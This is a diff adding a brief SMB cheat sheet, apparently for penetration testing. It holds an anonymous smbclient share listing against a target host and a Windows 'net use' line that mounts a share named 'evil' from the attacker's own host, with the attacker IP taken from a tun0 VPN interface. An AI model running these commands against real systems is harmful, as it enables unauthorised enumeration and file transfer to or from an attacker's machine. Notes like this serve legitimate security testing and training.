@@ -1,0 +1,10 @@
+% smb
+
+# smbclient anonymous list
+smbclient -L //<RHOST> -U ''
+
+# windows mount smb
+net use z: \\\<LHOST>\evil /user:evil evil
+dir Z:\
+
+$ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
